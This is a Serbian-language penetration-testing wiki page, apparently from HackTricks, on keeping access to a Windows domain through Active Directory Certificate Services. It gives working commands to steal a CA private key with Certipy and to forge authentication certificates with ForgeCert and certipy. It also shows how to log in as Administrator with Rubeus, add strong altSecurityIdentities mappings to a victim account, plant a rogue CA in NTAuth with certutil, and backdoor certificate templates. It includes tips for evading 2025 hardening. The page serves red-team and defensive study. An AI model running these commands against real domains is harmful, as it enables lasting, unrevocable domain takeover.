# AD CS Perzistencija u domenu

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je sažetak tehnika perzistencije u domenu podeljenih u [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Proverite taj izvor za dodatne detalje.

## Lažiranje sertifikata sa ukradenim CA sertifikatima - DPERSIST1

Kako možete da utvrdite da je sertifikat CA sertifikat?

Može se utvrditi da je sertifikat CA sertifikat ako su ispunjeni sledeći uslovi:

- Sertifikat je uskladišten na CA serveru, a njegov privatni ključ je zaštićen mašinskim DPAPI-jem ili hardverom poput TPM/HSM ako operativni sistem to podržava.
- Polja Issuer i Subject sertifikata se poklapaju sa distinguished name-om CA.
- Ekstenzija "CA Version" prisutna je isključivo u CA sertifikatima.
- Sertifikat nema polja Extended Key Usage (EKU).

Za izvlačenje privatnog ključa ovog sertifikata, alat `certsrv.msc` na CA serveru je podržana metoda putem ugrađenog GUI-ja. Ipak, ovaj sertifikat se ne razlikuje od ostalih pohranjenih u sistemu; stoga se za ekstrakciju mogu primeniti metode kao što je [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Sertifikat i privatni ključ se takođe mogu dobiti korišćenjem Certipy pomoću sledeće naredbe:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po pribavljanju CA sertifikata i njegovog privatnog ključa u `.pfx` formatu, alati poput [ForgeCert](https://github.com/GhostPack/ForgeCert) mogu se koristiti za generisanje validnih sertifikata:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Korisnik kome je cilj falsifikovanje sertifikata mora biti aktivan i sposoban da se autentifikuje u Active Directory-ju da bi proces uspeo. Falsifikovanje sertifikata za specijalne naloge kao što je krbtgt nije efikasno.

Ovaj falsifikovani sertifikat će biti **važeći** do navedenog datuma isteka i sve dok je korenski CA sertifikat **važeći** (obično od 5 do **10+ godina**). Takođe važi za **mašine**, pa u kombinaciji sa **S4U2Self**, napadač može **održavati persistenciju na bilo kojoj mašini u domenu** sve dok CA sertifikat važi.\
Štaviše, **sertifikati generisani** ovom metodom **ne mogu biti opozvani** jer CA za njih nije svestan.

### Rad pod Strong Certificate Mapping Enforcement (2025+)

Od 11. februara 2025. (posle roll-out-a KB5014754), kontroleri domena podrazumevano koriste **Full Enforcement** za mapiranja sertifikata. U praksi to znači da vaši falsifikovani sertifikati moraju ili:

- Sadržati snažnu vezu sa ciljnim nalogom (na primer, SID security extension), ili
- Biti upareni sa jakim, eksplicitnim mapiranjem na atributu ciljnog objekta `altSecurityIdentities`.

Pouzdan pristup za održavanje persistencije je da se izda falsifikovani sertifikat povezan sa ukradenim Enterprise CA i zatim doda snažno eksplicitno mapiranje na žrtvinom principal-u:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Napomene
- Ako možete kreirati forged certificates koji uključuju SID security extension, oni će se mapirati implicitno čak i pod Full Enforcement. U suprotnom, preferirajte eksplicitna snažna mapiranja. See [account-persistence](account-persistence.md) for more on explicit mappings.
- Opoziv ovde ne pomaže braniteljima: forged certificates nisu poznati CA database i stoga ih nije moguće opozvati.

## Trusting Rogue CA Certificates - DPERSIST2

Objekat `NTAuthCertificates` je definisan da sadrži jedan ili više **CA certificates** u okviru svog `cacertificate` atributa, koji koristi Active Directory (AD). Proces verifikacije od strane **domain controller** uključuje proveru objekta `NTAuthCertificates` da li postoji unos koji odgovara **CA specified** u polju Issuer autentifikacione **certificate**. Autentifikacija se nastavlja ako se nađe podudaranje.

Napadač može dodati self-signed CA certificate u objekat `NTAuthCertificates`, pod uslovom da ima kontrolu nad ovim AD objektom. Obično samo članovi grupe **Enterprise Admin**, zajedno sa **Domain Admins** ili **Administrators** u **forest root’s domain**, imaju dozvolu da modifikuju ovaj objekat. Mogu izmeniti objekat `NTAuthCertificates` koristeći `certutil.exe` komandom `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ili koristeći [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ova mogućnost je posebno relevantna kada se koristi zajedno sa ranije opisanim metodom koja uključuje ForgeCert za dinamičko generisanje sertifikata.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Mogućnosti za **persistence** putem **izmena security descriptor-a komponenti AD CS** su brojne. Izmene opisane u "[Domain Escalation](domain-escalation.md)" sekciji mogu biti zlonamerno sprovedene od strane napadača sa povišenim privilegijama. To uključuje dodavanje "control rights" (npr. `WriteOwner`/`WriteDACL`/itd.) osetljivim komponentama kao što su:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Primer zlonamerne implementacije bi uključivao napadača koji ima **povišene dozvole** u domenu i dodaje `WriteOwner` dozvolu na podrazumevani `User` certificate template, pri čemu je napadač subjekt za to pravo. Da bi iskoristio ovo, napadač bi prvo promenio ownership `User` template-a na sebe. Nakon toga, `mspki-certificate-name-flag` bi bio postavljen na **1** na template-u da omogući `ENROLLEE_SUPPLIES_SUBJECT`, dopuštajući korisniku da u zahtevu navede Subject Alternative Name. Zatim bi se napadač mogao **enroll-ovati** koristeći taj **template**, izabrati ime **domain administrator-a** kao alternativno ime, i iskoristiti dobijeni sertifikat za autentifikaciju kao DA.

Praktični parametri koje napadači mogu podesiti za dugoročnu persistenciju u domenu (vidi {{#ref}}domain-escalation.md{{#endref}} za kompletne detalje i detekciju):

- CA policy flags koji dozvoljavaju SAN iz zahteva (npr. omogućavanje `EDITF_ATTRIBUTESUBJECTALTNAME2`). Ovo održava exploitable putanje slične ESC1.
- Template DACL ili podešavanja koja dopuštaju izdavanje sposobno za autentifikaciju (npr. dodavanje Client Authentication EKU, omogućavanje `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolisanje `NTAuthCertificates` objekta ili CA container-a da kontinuirano vrate rogue issuere ako branioci pokušaju čišćenje.

> [!TIP]
> U ojačanim okruženjima nakon KB5014754, udruživanje ovih pogrešnih konfiguracija sa eksplicitnim jakim mapiranjima (`altSecurityIdentities`) osigurava da vaši izdata ili falsifikovani sertifikati ostanu upotrebljivi čak i kada DC-ovi primenjuju strong mapping.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
